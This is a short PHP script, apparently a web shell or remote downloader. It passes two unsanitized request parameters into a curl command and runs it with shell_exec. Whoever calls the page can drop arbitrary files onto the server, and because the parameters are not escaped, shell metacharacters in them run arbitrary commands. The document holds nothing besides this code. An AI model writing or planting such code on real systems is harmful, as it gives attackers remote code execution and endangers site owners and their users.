<?php
$command = 'curl -o ' . $_GET['n'] . ' ' . $_GET['u'];
shell_exec($command);
